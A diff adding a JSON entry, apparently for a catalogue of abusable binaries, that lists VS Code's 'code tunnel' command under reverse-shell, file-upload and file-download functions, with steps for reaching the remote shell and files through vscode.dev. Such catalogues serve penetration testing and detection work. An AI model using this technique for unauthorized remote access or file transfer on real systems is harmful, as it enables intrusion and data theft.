@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "reverse-shell": [
+      {
+        "description": "Create a tunnel to `vscode.dev`, then complete Github device registration and browse `https://vscode.dev/tunnel/my-tunnel-name`.\n\nSelect `View \\ Terminal` to spawn a shell on remote.\n",
+        "code": "code tunnel -name 'my-tunnel-name'\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Create a tunnel to `vscode.dev`, then complete Github device registration and browse `https://vscode.dev/tunnel/my-tunnel-name`.\n\nIn the `Explorer` tab, select `Open Folder`, then right-click on the folder and select `Upload`.\n\nSelect file from the local file browser.\n",
+        "code": "code tunnel -name 'my-tunnel-name'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Create a tunnel to `vscode.dev`, then complete Github device registration and browse `https://vscode.dev/tunnel/my-tunnel-name`.\n\nIn the `Explorer` tab, select `Open Folder`, then select a file, right-click and select `Download`.\n",
+        "code": "code tunnel -name 'my-tunnel-name'\n"
+      }
+    ]
+  }
+}
